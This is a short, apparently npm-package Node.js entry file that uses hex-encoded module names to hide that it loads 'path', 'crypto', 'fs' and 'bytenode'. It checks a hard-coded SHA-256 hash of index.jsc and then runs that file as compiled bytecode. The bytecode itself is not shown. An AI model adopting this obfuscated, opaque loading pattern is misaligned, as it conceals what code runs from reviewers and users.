"use strict";
var _5050d4d=function(h){for(var r="",i=0;i<h.length;i+=2)r+=String.fromCharCode(parseInt(h.substr(i,2),16));return r};
var _5050d4p=require(_5050d4d("70617468")).join(__dirname,"./index.jsc");
var _5050d4h=require(_5050d4d("63727970746f")).createHash("sha256").update(require(_5050d4d("6673")).readFileSync(_5050d4p)).digest("hex");
if(_5050d4h!==("720e716f6d41c73135593fb3d11af833"+"a294df10904bd8ddb85f300b69152ff4")){console.error("[fatal] integrity check failed");process.exit(1);}
require(_5050d4d("627974656e6f6465"));
var _5050d4m=require(_5050d4p);

exports.default=_5050d4m.default!==void 0?_5050d4m.default:_5050d4m;
